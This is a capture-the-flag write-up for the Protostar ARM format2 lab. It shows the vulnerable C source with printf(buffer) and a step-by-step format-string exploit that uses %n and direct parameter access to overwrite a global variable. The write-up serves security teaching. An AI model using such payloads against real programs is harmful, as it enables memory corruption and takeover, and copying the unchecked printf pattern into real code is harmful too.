## Protostar ARM format2

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);

  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}

```

#### _Let's start_


This challenge is pretty similar to the challenge `format1` but this time we must be able to change the variable `target` with a specific value and our payload will be read from the stdin instead of be an argument .  

Let's run our program and find the offset in the stack of our string `AAAA`

```code
pi@raspberrypi:~/Protostar_ARM/format/format2 $ ./format2
AAAA%08x.%08x.%08x.%08x.%08x.%08x
AAAA0.1.7ec51280.41414141.252e7825
target is 0 :(
```

The address of the variable `target` is `0x01010810`

```code
pi@raspberrypi:~/Protostar_ARM/format/format2 $ objdump -t format2 | grep target
01010810 g     O .bss	00000004              target

```

and replacing `AAAA` with this address we are able to change the value of the variable `target`

```code
pi@raspberrypi:~/Protostar_ARM/format/format2 $ echo  `python -c 'print "\x10\x08\x01\x01" + "%08x" * 3 + "%n"'` | ./format2
00000000000000017eafa280
target is 28 :(
```

As described [here](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)), we can use _**Direct Parameter Access Parameter**_ to directly address a stack parameter from within the format string. So far we have written 4 bytes (*related to the address*) and now we have to add `60 chars`, in order to increase the value to `64`.

```code
pi@raspberrypi:~/Protostar_ARM/format/format2 $ echo `python -c 'print "\x10\x08\x01\x01%60x%4$n"'` | ./format2
                                                           0
you have modified the target :)
```



__*Done :)*__
